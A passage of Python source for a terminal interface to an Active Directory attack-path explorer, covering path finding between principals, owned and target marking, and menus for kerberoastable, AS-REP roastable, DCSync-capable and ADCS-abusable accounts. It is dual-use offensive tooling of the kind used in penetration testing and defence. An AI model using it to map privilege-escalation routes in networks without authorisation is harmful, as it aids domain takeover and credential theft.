    BINDINGS = [
        Binding("escape", "back", "Back"),
        Binding("i", "drill", "Info on selected"),
    ]

    def __init__(self, sid):
        super().__init__()
        self.sid = sid

    def compose(self) -> ComposeResult:
        yield Header(show_clock=False)
        v = NodeInfoView(self.sid)
        v.id = "niview"
        yield v
        yield Footer()

    def action_back(self):
        self.app.pop_screen()

    def action_drill(self):
        v = self.query_one("#niview", NodeInfoView)
        sid = v._cursor_sid()
        if sid and sid != v.sid:
            self.app.push_screen(NodeInfoScreen(sid))


# --------------------------------------------------------------------------- #
# export a principal list to a .txt — pick which fields
# --------------------------------------------------------------------------- #
class ExportScreen(Screen):
    """Tick the columns you want, then write the table's current (filtered + sorted) rows
    to a tab-separated .txt in the working directory. Space toggles a column, Ctrl+S (or
    the Export button) writes the file, Esc cancels."""
    BINDINGS = [
        Binding("escape", "back", "Cancel"),
        Binding("ctrl+s", "do_export", "Export", priority=True),
    ]

    def __init__(self, table):
        super().__init__()
        self.table = table

    def compose(self) -> ComposeResult:
        yield Header(show_clock=False)
        sel = SelectionList(
            *[Selection(label, fid, fid in EXPORT_DEFAULT) for fid, label in EXPORT_FIELDS],
            id="exportlist")
        n = len(self.table._export_sids())
        sel.border_title = (f"export {n} rows from “{self.table.title}” — Space toggles a "
                            "column · Ctrl+S writes the file · Esc cancels")
        yield sel
        yield Button("Export selected columns  (Ctrl+S)", id="exportbtn", variant="primary")
        yield Footer()

    def on_mount(self):
        self.query_one("#exportlist", SelectionList).focus()

    def action_back(self):
        self.app.pop_screen()

    def on_button_pressed(self, event: Button.Pressed):
        self.action_do_export()

    def action_do_export(self):
        fields = list(self.query_one("#exportlist", SelectionList).selected)
        if not fields:
            self.app.notify("Pick at least one column (Space to tick).", title="Export",
                            severity="warning", timeout=5)
            return
        # write in the canonical EXPORT_FIELDS order, not the toggle order
        fields = [fid for fid, _l in EXPORT_FIELDS if fid in fields]
        path, count = self.table.export_to_file(fields)
        self.app.pop_screen()
        self.app.notify(f"Exported {count} rows ({len(fields)} cols) → {path}",
                        title="Export", timeout=8)


# --------------------------------------------------------------------------- #
# plain scrollable text overlay (reused CLI reports)
# --------------------------------------------------------------------------- #
class TextScreen(Screen):
    BINDINGS = [Binding("escape", "back", "Back")]

    def __init__(self, g, title, producer):
        super().__init__()
        self.g = g
        self._title = title
        self.producer = producer

    def compose(self) -> ComposeResult:
        yield Header(show_clock=False)
        yield TextPane(self._title, self.producer)
        yield Footer()

    def action_back(self):
        self.app.pop_screen()


class ConfirmScreen(ModalScreen):
    """Yes / No dialog; dismisses with True or False."""
    BINDINGS = [Binding("escape", "no", "No"), Binding("n", "no", "No"),
                Binding("y", "yes", "Yes")]

    def __init__(self, question):
        super().__init__()
        self.question = question

    def compose(self) -> ComposeResult:
        with Vertical(id="confirmbox"):
            yield Static(self.question, id="confirmq")
            with Horizontal(id="confirmbtns"):
                yield Button("Yes (y)", id="yes", variant="error")
                yield Button("No (n)", id="no", variant="primary")

    def on_button_pressed(self, event):
        self.dismiss(event.button.id == "yes")

    def action_yes(self):
        self.dismiss(True)

    def action_no(self):
        self.dismiss(False)


class PathView(AttackTreeBase):
    """Shortest control path between ANY two nodes, in the box: FROM / TO inputs with a
    live match list on top, the path as a drillable tree below. ^p pins it to the attack tree."""
    BINDINGS = [Binding("ctrl+r", "swap", "Swap FROM/TO"),
                Binding("ctrl+p", "pin", "Pin to attack tree")]
    MAX_HITS = 60

    def __init__(self):
        super().__init__()
        self.sel = {"patha": None, "pathb": None}
        self._active = "patha"
        self._hits = []

    @property
    def priv(self):
        return self.app.priv

    def _ctx_label(self):
        return "path"

    def compose(self) -> ComposeResult:
        with Vertical(id="pathpanel"):
            with Horizontal(classes="pathrow"):
                yield Static(Text("FROM", style="bold"), classes="pathlbl")
                yield Input(placeholder="type a name…", id="patha")
                yield Static(id="patha_sel", classes="pathsel")
            with Horizontal(classes="pathrow"):
                yield Static(Text("TO", style="bold"), classes="pathlbl")
                yield Input(placeholder="type a name…", id="pathb")
                yield Static(id="pathb_sel", classes="pathsel")
            yield Static(id="pathhitshdr")
            hits = OptionList(id="pathhits")
            hits.can_focus = False
            yield hits
            yield Static(self._legend(), id="pathkeys")
        tree = Tree("", id="tree")
        tree.show_root = True
        yield tree

    @staticmethod
    def _legend():
        t = Text()
        for key, what in (("↑↓", "move"), ("Enter", "pick"), ("Tab", "next box / tree"),
                          ("^r", "swap"), ("^p", "pin to attack tree")):
            t.append(f" {key} ", style="bold black on grey58")
            t.append(f" {what}   ", style="grey70")
        return t

    def on_mount(self):
        app, g = self.app, self.g
        self.query_one("#pathpanel").border_title = "path between two nodes"
        a, b = app.path_pick
        if a not in g.nodes:
            a = app.start or (next(iter(app.owned)) if len(app.owned) == 1 else None)
        if a in g.nodes:
            self._choose("patha", a, advance=False)
        if b in g.nodes:
            self._choose("pathb", b, advance=False)
        focus = "pathb" if self.sel["patha"] and not self.sel["pathb"] else "patha"
        self._active = focus
        self.query_one(f"#{focus}", Input).focus()
        self._refresh_hits()
        self._render_sel()
        self._search()

    # ---- matching --------------------------------------------------------
    def _quick_picks(self, which):
        """Suggestions for an empty box: your footholds for FROM, targets / high-value for TO."""
        app, g = self.app, self.g
        if which == "patha":
            sids = ([app.start] if app.start else []) + sorted(app.owned, key=lambda s: short(g, s))
        else:
            sids = sorted(app.targets, key=lambda s: short(g, s)) + sorted(
                (s for s in g.nodes if g.is_highvalue(s) and g.nodes[s].kind in ("Group", "Domain")),
                key=lambda s: short(g, s))
        seen, out = set(), []
        for s in sids:
            if s in g.nodes and s not in seen:
                seen.add(s); out.append(s)
        return out[:self.MAX_HITS]

    def _matches(self, token):
        g = self.g
        t = token.strip().upper()
        if not t:
            return None
        if t in g.nodes:
            return [t]
        scored = []
        for sid, n in g.nodes.items():
            full = (n.name or "").upper()
            base = full.split("@")[0]
            if t in full or t in sid.upper():
                rank = 0 if base == t else 1 if base.startswith(t) else 2 if t in base else 3
                scored.append((rank, len(base), base, sid))
        scored.sort()
        return [x[3] for x in scored]

    def _label(self, sid):
        g, app = self.g, self.app
        n = g.nodes[sid]
        t = Text()
        mark = (OWNED if sid in app.owned else TARGET if sid in app.targets else "  ")
        t.append(mark + " ")
        t.append(f"{short(g, sid):<34}", style="bold red" if g.is_highvalue(sid) else "white")
        t.append(f" {n.kind:<13}", style="grey62")
        dom = n.name.split("@", 1)[1] if "@" in (n.name or "") else ""
        if dom:
            t.append(dom.lower(), style="grey42")
        return t

    def _refresh_hits(self):
        which = self._active
        val = self.query_one(f"#{which}", Input).value
        m = self._matches(val)
        quick = m is None
        hits = self._quick_picks(which) if quick else m
        total = len(hits)
        self._hits = hits[:self.MAX_HITS]
        ol = self.query_one("#pathhits", OptionList)
        ol.clear_options()
        for s in self._hits:
            ol.add_option(Option(self._label(s), id=s))
        if self._hits:
            ol.highlighted = 0
        box = "FROM" if which == "patha" else "TO"
        hdr = Text()
        if quick:
            hdr.append(f"{box}: ", style="bold cyan")
            hdr.append(("your start / owned nodes" if which == "patha"
                        else "targets + high-value groups") if self._hits
                       else "start typing to search every node", style="grey62")
        else:
            hdr.append(f"{box}: ", style="bold cyan")
            hdr.append(f"{total} match{'es' if total != 1 else ''}"
                       + (f" (first {self.MAX_HITS})" if total > self.MAX_HITS else ""),
                       style="grey62" if total else "red")
        self.query_one("#pathhitshdr", Static).update(hdr)

    # ---- selection ---------------------------------------------------------
    def _render_sel(self):
        for which in ("patha", "pathb"):
            sid = self.sel[which]
            st = self.query_one(f"#{which}_sel", Static)
            if sid:
                st.update(Text(f"{CHECK} {self.g.nodes[sid].kind}", style="bold green"))
            else:
                st.update(Text("—", style="grey42"))

    def _choose(self, which, sid, advance=True):
        self.sel[which] = sid
        self.app.path_pick = [self.sel["patha"], self.sel["pathb"]]
        inp = self.query_one(f"#{which}", Input)
        inp.value = short(self.g, sid)
        inp.cursor_position = len(inp.value)
        self._render_sel()
        other = "pathb" if which == "patha" else "patha"
        if advance and not self.sel[other]:
            self.query_one(f"#{other}", Input).focus()
        self._search()

    def on_descendant_focus(self, event):
        w = event.widget
        if isinstance(w, Input) and w.id in self.sel and w.id != self._active:
            self._active = w.id
            self._refresh_hits()

    def on_input_changed(self, event):
        which = event.input.id
        if which not in self.sel:
            return
        sid = self.sel[which]
        if sid and event.value != short(self.g, sid):
            self.sel[which] = None
            self.app.path_pick = [self.sel["patha"], self.sel["pathb"]]
            self._render_sel()
            self._search()
        self._active = which
        self._refresh_hits()

    def on_key(self, event):
        if event.key in ("up", "down") and isinstance(self.app.focused, Input):
            ol = self.query_one("#pathhits", OptionList)
            if ol.option_count:
                (ol.action_cursor_down if event.key == "down" else ol.action_cursor_up)()
            event.stop(); event.prevent_default()

    def on_input_submitted(self, event):
        which = event.input.id
        ol = self.query_one("#pathhits", OptionList)
        if ol.highlighted is not None and self._hits:
            self._choose(which, self._hits[ol.highlighted])
        else:
            self._search()

    def on_option_list_option_selected(self, event):
        if event.option.id in self.g.nodes:
            self._choose(self._active, event.option.id)
            self.query_one(f"#{self._active}", Input).focus()

    def action_swap(self):
        a, b = self.sel["patha"], self.sel["pathb"]
        va = self.query_one("#patha", Input).value
        vb = self.query_one("#pathb", Input).value
        self.sel = {"patha": b, "pathb": a}
        self.app.path_pick = [b, a]
        self.query_one("#patha", Input).value = vb
        self.query_one("#pathb", Input).value = va
        self._render_sel()
        self._search()

    # ---- result ----------------------------------------------------------------
    def _shown(self):
        """(src, dst) of the path currently drawn — the reverse pair if only that exists."""
        src, dst = self.sel["patha"], self.sel["pathb"]
        if not src or not dst or src == dst:
            return None
        if self.g.bfs_path(src, dst):
            return (src, dst)
        if self.g.bfs_path(dst, src):
            return (dst, src)
        return None

    def _pin_label(self, pair):
        pinned = pair in self.app.paths
        return Text(f"{PIN} " + ("pinned to the attack tree — ^p / Enter unpins" if pinned
                                 else "add this path to the attack tree — ^p / Enter"),
                    style="bold green" if pinned else "bold cyan")

    def _search(self):
        g = self.g
        src, dst = self.sel["patha"], self.sel["pathb"]
        tree = self.query_one("#tree", Tree)
        tree.clear()
        root = tree.root
        root.data = None
        if not src or not dst:
            root.set_label(Text("pick a node in both boxes", style="grey50"))
            return
        if src == dst:
            root.set_label(Text("same node — pick two different ones", style="yellow"))
            return
        pair = self._shown()
        if pair is None:
            self._no_path(root, src, dst)
            return
        a, b = pair
        path = g.bfs_path(a, b)
        lab = Text()
        if pair != (src, dst):
            lab.append("reverse only (^r swaps):  ", style="yellow")
        lab.append_text(ntext(g, a, priv=self.priv))
        lab.append("  →  ", style="bold cyan")
        lab.append_text(ntext(g, b, priv=self.priv))
        lab.append(f"   ({len(path) - 1} hop{'s' if len(path) != 2 else ''})", style="grey62")
        root.set_label(lab)
        root.data = {"sid": a, "anc": frozenset({a}), "loaded": True}
        pin = root.add_leaf(self._pin_label(pair), data={"action": "pin"})
        pin.allow_expand = False
        self._add_path_hops(root, a, b, path=path)
        root.expand()

    def _no_path(self, root, src, dst):
        g = self.g
        lab = Text(" ✗ NO PATH ", style="bold white on dark_red")
        lab.append("  ")
        lab.append_text(ntext(g, src, priv=self.priv))
        lab.append("  ✗  ", style="bold red")
        lab.append_text(ntext(g, dst, priv=self.priv))
        root.set_label(lab)
        root.data = None
        root.add_leaf(Text(f"{short(g, src)} has no control edge chain to {short(g, dst)} — "
                           "and none runs the other way either.",
                           style="red")).allow_expand = False
        back = g.reached_by(dst)
        near = sorted((x for x in back if x not in (src, dst) and g.nodes.get(x)),
                      key=lambda x: (back[x], short(g, x).lower()))
        if near:
            hdr = root.add(Text(f"who CAN reach {short(g, dst)} ({len(near)}) — get one of these "
                                "first, then path from it", style="bold yellow"), expand=True)
            for x in near[:INLINE_CAP]:
                line = self._line(x)
                line.append(f"   {back[x]}h", style="grey50")
                hdr.add(line, data={"sid": x, "anc": frozenset({x})}).allow_expand = False
            if len(near) > INLINE_CAP:
                hdr.add(Text(f"... +{len(near) - INLINE_CAP} more (open list)", style="grey50"),
                        data={"list": (f"Who can reach {short(g, dst)}", near)}).allow_expand = False
        else:
            root.add_leaf(Text(f"nothing in this data has a control path to {short(g, dst)}.",
                               style="grey62")).allow_expand = False
        root.expand()

    def action_pin(self):
        pair = self._shown()
        if pair is None:
            self.app.notify("pick two nodes with a path between them first", severity="warning")
            return
        g = self.g
        if pair in self.app.paths:
            self.app.paths.remove(pair)
            self.app.notify(f"unpinned {short(g, pair[0])} → {short(g, pair[1])}")
        else:
            self.app.paths.append(pair)
            self.app.notify(f"pinned {short(g, pair[0])} → {short(g, pair[1])} "
                            "to the attack tree (a)")
        for node in self.query_one("#tree", Tree).root.children:
            if (node.data or {}).get("action") == "pin":
                node.set_label(self._pin_label(pair))

    def on_tree_node_selected(self, event: Tree.NodeSelected):
        if (event.node.data or {}).get("action") == "pin":
            self.action_pin()
            return
        super().on_tree_node_selected(event)


class HelpScreen(Screen):
    """Key reference for every view. `?` opens it from anywhere; Esc or `?` closes it."""
    BINDINGS = [Binding("escape", "back", "Close"),
                Binding("question_mark", "back", "Close")]
    SECTIONS = [
        ("Everywhere", [
            ("?", "this help"),
            ("Esc / Backspace", "back one step (Esc at the start view quits)"),
            ("i", "node info for the selected row"),
            ("^o", "mark / unmark the selected node as owned"),
            ("^t", "mark / unmark the selected node as a target"),
            ("^c / ^q", "quit")]),
        ("Symbols", [
            (OWNED, "owned — a principal you control (^o)"),
            (TARGET, "target — something you're going after (^t)"),
            (OWNED + TARGET, "a target you already own"),
            (PIN, "a path pinned to the attack tree (p, then ^p)"),
            (STAR, "high-value / privileged (red name = Tier-0)"),
            (KERB_MARK, "kerberoastable — has an SPN, crack the ticket for creds (purple name)"),
            (REACH_MARK, "your owned set has a control path to it (hops · via which foothold)"),
            (CHECK, "a right you already hold / a picked node"),
            ("✗", "no control path"),
            ("⚠", "data-quality note (see Domain summary)")]),
        ("Jump to a view", [
            ("/ or t", "search all nodes (REACH column = path from owned)"),
            ("u", "users"), ("c", "computers"), ("g", "groups"), ("a", "attack tree"),
            ("p", "path between two nodes")]),
        ("Trees (attack tree, routes, node info)", [
            ("Enter / Space", "expand a row, or open a node that has no children"),
            ("arrows", "move"),
            ("y", "copy the selected line or section to the clipboard")]),
        ("Lists (users, computers, groups, ...)", [
            ("type", "filter the list"),
            ("click a column header", "sort by it; the search box then matches that column"),
            ("Enter", "open the selected node"),
            ("^e", "show enabled accounts only"),
            ("^x", "export the current list")]),
        ("Export", [("^s", "write the file"), ("Esc", "cancel")]),
        ("Loading", [
            ("-d DATA", "a .zip / dir / .json collection"),
            ("-d a -d b", "repeat -d to merge per-box collections into one graph")]),
        ("Saved state", [
            ("auto", "owned / targets / start / pinned paths are saved per domain"),
            ("menu", "Reset saved state clears them (asks first)"),
            ("--fresh", "launch flag: start clean and delete the saved state")]),
    ]

    def compose(self) -> ComposeResult:
        yield Header(show_clock=False)
        t = Text()
        for title, keys in self.SECTIONS:
            t.append(f"{title}\n", style="bold")
            for key, what in keys:
                t.append(f"  {key}" + " " * max(1, 24 - cell_len(key)), style="bold cyan")
                t.append(f"{what}\n", style="grey70")
            t.append("\n")
        yield VerticalScroll(Static(t, id="helpbody"))
        yield Footer()

    def action_back(self):
        self.app.pop_screen()


# --------------------------------------------------------------------------- #
# the hub
# --------------------------------------------------------------------------- #
class HomeScreen(Screen):
    """The whole app. Left: a compact menu + live overview. Right: one big box that
    shows whatever you pick — the attack tree, an analysis, a searchable list. Picking
    a node from a list re-roots the tree back in that box. Esc steps back; Esc at the
    tree quits."""
    BINDINGS = [
        Binding("escape", "back", "Back"),
        Binding("backspace", "back", "Back"),     # same as Esc — one consistent "go back"
        Binding("i", "info", "Node info"),
        Binding("ctrl+o", "owned", "Mark owned"),
        Binding("ctrl+t", "target", "Mark target"),
        Binding("t", "goto('search')", "Search", show=False),
        Binding("u", "goto('users')", "Users"),
        Binding("c", "goto('computers')", "Computers"),
        Binding("g", "goto('groups')", "Groups"),
        Binding("a", "goto('tree')", "Attack tree"),
        Binding("slash", "goto('search')", "Search"),
        Binding("p", "goto('path')", "Path A→B"),
        Binding("ctrl+c", "quit", "Quit", priority=True),
        Binding("ctrl+q", "quit", "Quit", priority=True),
    ]

    def action_goto(self, mid):
        self.dispatch(mid)

    def on_resize(self, event):
        self._place_version()

    def _place_version(self):
        """Pin the version tag to the right end of the footer row (it sits on its own
        layer; a full-width strip would paint over the footer's key legend)."""
        try:
            v = self.query_one("#version")
        except Exception:
            return
        w = len(f"bernese v{__version__}") + 2
        v.styles.offset = (max(0, self.size.width - w), 0)

    # (id, label).  COUNTABLE items grey out + read "none" at 0 instances.
    MENU = [
        ("search", "Search all nodes"),
        ("path", "Path between two nodes"),
        ("users", "Users"),
        ("computers", "Computers"),
        ("groups", "Groups"),
        ("tree", "Attack tree"),
        ("esc", "Escalation routes"),
        ("das", "Domain admins & high-value"),
        ("rights", "Rights search (who holds a right)"),
        ("kerb", "Kerberoastable accounts"),
        ("asrep", "AS-REP roastable accounts"),
        ("dcsync", "DCSync-capable principals"),
        ("dcs", "Domain controllers"),
        ("adminto", "Local admin (AdminTo)"),
        ("deleg", "Delegation (unconstr / RBCD)"),
        ("adcs", "ADCS / certificate abuse"),
        ("maq", "MAQ & owned machines"),
        ("pwpol", "Domain password policy"),
        ("summary", "Domain summary"),
        ("reset", "Reset saved state"),
    ]
    COUNTABLE = {"das", "kerb", "asrep", "dcsync", "dcs", "adminto", "deleg", "adcs", "maq"}

    def __init__(self, g):
        super().__init__()
        self.g = g
        self._aux = None                       # the non-tree widget currently in the box
        self.box_stack = []                    # back history: thunks that rebuild box state
        self._current_restore = None
        self._view = None

    # ---- counts for the menu badges / greying ---------------------------
    def _deleg_sids(self):
        g = self.g
        sids = {n.sid for n in g.nodes.values()
                if n.p("unconstraineddelegation") or n.p("trustedtoauth")}
        for tgt, lst in g.rctrl.items():
            for (s, l) in lst:
                if l == "AllowedToAct":
                    sids.add(tgt); sids.add(s)
        return {s for s in sids if g.nodes.get(s)}

    def _counts(self):
        g = self.g
        da = len({s for s in bh._da_member_set(g)
                  if g.nodes.get(s) and g.nodes[s].kind == "User"})
        kerb = sum(1 for n in g.nodes.values() if n.kind == "User"
                   and (n.p("hasspn") or n.p("serviceprincipalnames")) and n.sid.rsplit("-", 1)[-1] != "502")
        asrep = sum(1 for n in g.nodes.values() if n.kind == "User" and n.p("dontreqpreauth"))
        dcsync = set()
        for d in g.domain_sids:
            for (s, l) in g.rctrl.get(d, []):
                if (l == "DCSync" or l in bh.REPL_RIGHTS) and not bh._is_default_dcsync(g, s):
                    dcsync.add(s)
        dcs = sum(1 for s, n in g.nodes.items() if n.kind == "Computer" and bh._is_dc(g, s))
        adminto = sum(1 for lst in g.ctrl.values() for (_d, l) in lst if l == "AdminTo")
        owned_m = len(bh._user_owned_computers(g))
        maqv = g.maq if isinstance(g.maq, int) else 0
        return {"das": da, "kerb": kerb, "asrep": asrep, "dcsync": len(dcsync), "dcs": dcs,
                "adminto": adminto, "deleg": len(self._deleg_sids()), "adcs": len(g.templates),
                "maq": owned_m + (1 if maqv > 0 else 0)}

    def _menu_options(self, counts):
        opts = []
        for mid, label in self.MENU:
            if mid in self.COUNTABLE:
                c = counts.get(mid, 0)
                if c == 0:
                    lab = Text(f"{label:<34}", style="grey50")
                    lab.append("none", style="grey50")
                    opts.append(Option(lab, id=mid, disabled=True))
                    continue
                lab = Text(f"{label:<34}", style="white")
                lab.append(f"{c:>4}", style="bold cyan")
                opts.append(Option(lab, id=mid))
            else:
                opts.append(Option(Text(label, style="white"), id=mid))
        return opts

    # ---- layout ----------------------------------------------------------
    def compose(self) -> ComposeResult:
        yield Header(show_clock=False)
        menu = OptionList(*self._menu_options(self._counts()), id="menu")
        overview = Overview(self.g)
        overview.id = "dashbox"
        side = Vertical(menu, overview, DetailPane(), id="side")
        yield Horizontal(side, Vertical(id="box"))
        yield Footer()
        yield Static(f"bernese v{__version__}", id="version")   # bottom-right, where the palette was

    def on_mount(self):
        self._place_version()
        self.query_one("#menu").border_title = "menu — ↑↓ · Enter"
        self.query_one("#dashbox").border_title = "overview"
        self.query_one("#sidedetailbox").border_title = "node detail — click for full info"
        self._view = ExploreView()
        self._view.id = "view"
        self.query_one("#box").mount(self._view)
        self._current_restore = self.show_view
        self._refresh()
        if self.app.start:
            self.call_after_refresh(lambda: self._view.load(self.app.start))
        else:
            self.call_after_refresh(self._view.show_empty)

    # ---- shared node-detail pane (left column, under the overview) ------
    def set_detail(self, sid=None, intro=None):
        try:
            box = self.query_one("#sidedetailbox", DetailPane)
            body = self.query_one("#sidedetail", Static)
        except Exception:
            return
        box.sid = sid                             # clicking the pane opens this node's info
        if intro is not None:
            box.border_title = "node detail"
            body.update(intro)
        elif sid:
            box.border_title = f"node detail — {short(self.g, sid)}  (click for info)"
            body.update(build_summary_compact(self.g, sid, self.app.priv))
        else:
            box.border_title = "node detail"
            body.update(Text("highlight a node to see its detail · i (or click) for full node info",
                             style="grey50"))

    def on_screen_resume(self):
        self._refresh()

    def reset_view(self):
        self.box_stack.clear()
        self._current_restore = self.show_view
        self.show_view()
        self._view.current = None
        self._view.show_empty()
        self._refresh()
        self.set_detail(None)

    def _refresh(self):
        try:
            self.query_one("#dashbox", Overview).refresh_data()
        except Exception:
            pass

    # ---- box swapping ----------------------------------------------------
    def _mount_aux(self, widget):
        if self._aux is not None:
            self._aux.remove()
        self._aux = widget
        self._view.display = False
        self.query_one("#box").mount(widget)

    def show_view(self):
        if self._aux is not None:
            self._aux.remove()
            self._aux = None
        self._view.display = True
        self.call_after_refresh(lambda: self._view.query_one("#tree").focus())

    def _go(self, builder):
        self.box_stack.append(self._current_restore)
        self._current_restore = builder
        builder()

    def action_back(self):
        # one consistent "go back": first step back through the box navigation, then walk
        # up the attack-tree drill history; at the very top it does nothing (quit is ^C/^Q).
        if self.box_stack:
            self._current_restore = self.box_stack.pop()
            self._current_restore()
        elif self._tree_live() and getattr(self._view, "history", None):
            self._view.root_back()

    def action_quit(self):
        self.app.exit()

    # ---- builders --------------------------------------------------------
    def _build_list(self, title, sids):
        self._mount_aux(PrincipalTable(self.g, list(sids), title, self.app.prof, show_kind=True))

    def _build_text(self, title, fn, *a):
        self._mount_aux(TextPane(title, lambda: capture(fn, *a)))

    def _build_rights(self):
        self._mount_aux(RightsTree())

    def _build_esc(self):
        self._mount_aux(EscalationView())

    def _build_maq(self):
        self._mount_aux(MaqView())

    def _build_deleg(self):
        self._mount_aux(DelegationView())

    def _build_summary(self):
        self._mount_aux(SummaryView())

    # ---- called from embedded widgets -----------------------------------
    def show_list(self, title, sids):
        self._go(lambda: self._build_list(title, sids))

    def open_start(self, sid):
        self.app.start = sid
        self.box_stack.clear()
        self._current_restore = self.show_view
        self._view.load(sid)
        self.show_view()
        self._refresh()

    # ---- tree key actions (only while the tree is the live pane) --------
    def _tree_live(self):
        return self._view is not None and self._view.display

    def _active_sid(self):
        """The principal currently highlighted, whatever view is live — the tree,
        a searchable list, the rights/escalation trees, or the MAQ view."""
        if self._tree_live():
            return self._view._cursor_sid() or self._view.current
        aux = self._aux
        if isinstance(aux, PrincipalTable):
            return aux._current_sid()
        if isinstance(aux, (AttackTreeBase, MaqView)):
            return aux._cursor_sid()
        return None

    def action_info(self):
        sid = self._active_sid()
        if sid:
            self.show_node_info(sid)

    def show_node_info(self, sid):
        """Open node info INSIDE the right-hand box (keeping the menu + overview on the
        left), not as a full-screen takeover. Esc steps back to what was there.

        If node info for this SAME node is already showing, do nothing — pressing `i`
        repeatedly must not stack up identical views (one Esc should step back once)."""
        if isinstance(self._aux, NodeInfoView) and self._aux.sid == sid:
            return
        self._go(lambda: self._mount_aux(NodeInfoView(sid)))

    def action_owned(self):
        if self._tree_live():
            self._view.act_owned()
        elif isinstance(self._aux, PrincipalTable):
            self._aux.mark_owned()
        elif isinstance(self._aux, AttackTreeBase):        # node info / escalation / rights …
            self._aux.toggle_owned_cursor()
        self._refresh()

    def action_target(self):
        """Ctrl+T toggles the highlighted node as a target (🎯) — listed in the overview
        with whether the owned set reaches it."""
        if isinstance(self._aux, PrincipalTable):
            self._aux.mark_target()
        else:
            sid = self._active_sid()
            if not sid:
                return
            self.app.targets.symmetric_difference_update({sid})
            if isinstance(self._aux, NodeInfoView):
                self._aux.query_one("#tree", Tree).root.set_label(self._aux._line(self._aux.sid))
        if self._tree_live():                    # keep the TARGETS tree in the attack view current
            self._view._fill_target_tree()
        self._refresh()

    def action_root_back(self):
        if self._tree_live():
            self._view.root_back()

    # ---- menu dispatch (shared by the menu and the clickable overview) ---
    def on_option_list_option_selected(self, event: OptionList.OptionSelected):
        self.dispatch(event.option.id)

    def dispatch(self, mid):
        g = self.g
        A = bh._A

        if ":" in mid:                      # overview position rows: "p<i>:<target>"
            mid = mid.rsplit(":", 1)[1]
        # a top-level menu / overview selection starts a fresh single level, so ONE Esc
        # returns to the tree (menu clicks don't stack up back-steps).
        self.box_stack.clear()
        self._current_restore = self.show_view
        if mid == "start_info":             # inspect the start node's own detail/privileges
            if self.app.start:
                self.show_node_info(self.app.start)
            return
        if mid.startswith("tgt_"):          # an overview TARGETS row → its node info + path
            if mid[4:] in g.nodes:
                self.show_node_info(mid[4:])
            return
        if mid in g.nodes:                  # an overview row keyed by a sid (e.g. an owned
            self.open_start(mid)            # foothold's privesc row) → open that node's tree
            return
        if mid in ("start", "start_tree", "start_path", "owned_view"):
            # overview rows → show the attack-tree view (OWNED SET and the routes below)
            self._view.show_empty()
            self.show_view()
        elif mid in ("search", "targets"):
            self._go(lambda: self._mount_aux(PrincipalTable(
                g, list(g.nodes), "All nodes — type to search · REACH = path from owned",
                self.app.prof, show_kind=True, reach=True)))
        elif mid == "groups":
            sids = [s for s, n in g.nodes.items() if n.kind == "Group"]
            self._go(lambda: self._build_list("Groups — read into a member", sids))
        elif mid == "users":
            sids = [s for s, n in g.nodes.items() if n.kind == "User"]
            self._go(lambda: self._build_list("Users", sids))
        elif mid == "computers":
            sids = [s for s, n in g.nodes.items() if n.kind == "Computer"]
            self._go(lambda: self._build_list("Computers", sids))
        elif mid == "laps":
            sids = sorted({r for r, _c in bh._laps_readers(g)})
            self._go(lambda: self._build_list("LAPS readers (non-admin → local admin)", sids))
        elif mid == "tree":
            if self.app.start:
                self._view.load(self.app.start, push=False)   # rebuild: owned set may have changed
            else:
                self._view.show_empty()                       # OWNED SET (or the ^o hint)
            self.show_view()
        elif mid == "rights":
            self._go(self._build_rights)
        elif mid == "maq":
            self._go(self._build_maq)
        elif mid == "esc":
            self._go(self._build_esc)
        elif mid == "das":
            sids = sorted({s for s in bh._da_member_set(g) if g.nodes.get(s)})
            self._go(lambda: self._build_list("Domain admins & high-value", sids))
        elif mid == "kerb":
            sids = [n.sid for n in g.nodes.values() if is_kerberoastable(g, n.sid)]
            self._go(lambda: self._mount_aux(PrincipalTable(
                g, sids, "Kerberoastable accounts", self.app.prof, show_kind=True, escalation=True)))
        elif mid == "asrep":
            sids = [n.sid for n in g.nodes.values() if n.kind == "User" and n.p("dontreqpreauth")]
            self._go(lambda: self._build_list("AS-REP roastable accounts", sids))
        elif mid == "dcsync":
            sids = set()
            for d in g.domain_sids:
                for (s, l) in g.rctrl.get(d, []):
                    if l == "DCSync" or l in bh.REPL_RIGHTS:
                        sids.add(s)
            sids = sorted(sids)
            self._go(lambda: self._build_list("DCSync-capable principals", sids))
        elif mid == "dcs":
            sids = [s for s, n in g.nodes.items() if n.kind == "Computer" and bh._is_dc(g, s)]
            self._go(lambda: self._build_list("Domain controllers", sids))
        elif mid == "deleg":
            self._go(self._build_deleg)
        elif mid == "adminto":
            self._go(lambda: self._build_text("Local admin rights (AdminTo)", bh.cmd_adminto, g, A()))
        elif mid == "adcs":
            self._go(lambda: self._build_text("ADCS / certificate abuse (ESC)", bh.cmd_adcs, g, A()))
        elif mid == "pwpol":
            self._go(lambda: self._build_text("Domain password policy", bh.cmd_pwpolicy, g, A()))
        elif mid == "summary":
            self._go(self._build_summary)
        elif mid == "reset":
            self.app.push_screen(ConfirmScreen(
                "Forget owned, targets and start node for this domain?\n"
                + bh.state_path(g)),
                lambda ok: ok and self.app.reset_state())
        elif mid == "path":
            self._go(lambda: self._mount_aux(PathView()))


# --------------------------------------------------------------------------- #
# app
# --------------------------------------------------------------------------- #
class BerneseApp(App):
    ENABLE_COMMAND_PALETTE = False        # drop Textual's built-in Ctrl+P command palette
    CSS = """
    Screen { layout: vertical; }
    Horizontal { height: 1fr; }
    #side { width: 48; height: 1fr; }
    #menu { height: auto; border: round $primary; }
    #dashbox { height: 1fr; border: round $secondary; padding: 0 1; }
    #dashtop { height: auto; }
    #dashhint { height: auto; color: $text-muted; text-style: bold; margin-top: 1; }
    #jump { height: 1fr; background: transparent; border: none; }
    #sidedetailbox { height: 13; border: round $secondary; padding: 0 1; }
    #sidedetail { height: auto; }
    #box { width: 1fr; height: 1fr; }
    #view { height: 1fr; }
    #tree { height: 1fr; border: round $primary; padding: 0 1; }
    /* stacked section trees (attack tree + other-routes, escalation sections): the scroll
       box carries the border; each inner tree is borderless, auto-height, with a gap below
       so the separate trees read as distinct, disconnected sections. */
    #treescroll, #escscroll, #summscroll { height: 1fr; border: round $primary; padding: 0 1; }
    #treescroll Tree, #escscroll Tree, #summscroll Tree {
        height: auto; border: none; background: transparent; margin: 0 0 1 0;
    }
    #niview { height: 1fr; }
    #helpbody { padding: 1 2; }
    ConfirmScreen { align: center middle; }
    #confirmbox { width: 70; height: auto; border: thick $error; background: $panel; padding: 1 2; }
    #confirmq { margin-bottom: 1; }
    #confirmbtns { height: auto; align: center middle; }
    #confirmbtns Button { margin: 0 2; }
    PathView { height: 1fr; }
    #pathpanel { height: auto; border: round $primary; padding: 0 1; }
